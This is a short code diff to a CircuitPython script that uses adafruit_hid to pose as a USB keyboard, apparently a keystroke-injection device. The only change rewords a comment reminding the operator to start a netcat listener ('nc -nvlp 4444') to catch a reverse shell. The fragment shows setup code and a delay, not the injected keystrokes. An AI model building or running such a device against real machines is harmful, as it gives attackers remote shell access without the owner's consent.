@@ -2,7 +2,7 @@ import time
 import usb_hid
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keycode import Keycode
-#START LISTENER WITH nc -nvlp 4444
+# REMINDER START LISTENER WITH nc -nvlp 4444
 keyboard = Keyboard(usb_hid.devices)
 
 time.sleep(3)  # Delay before execution
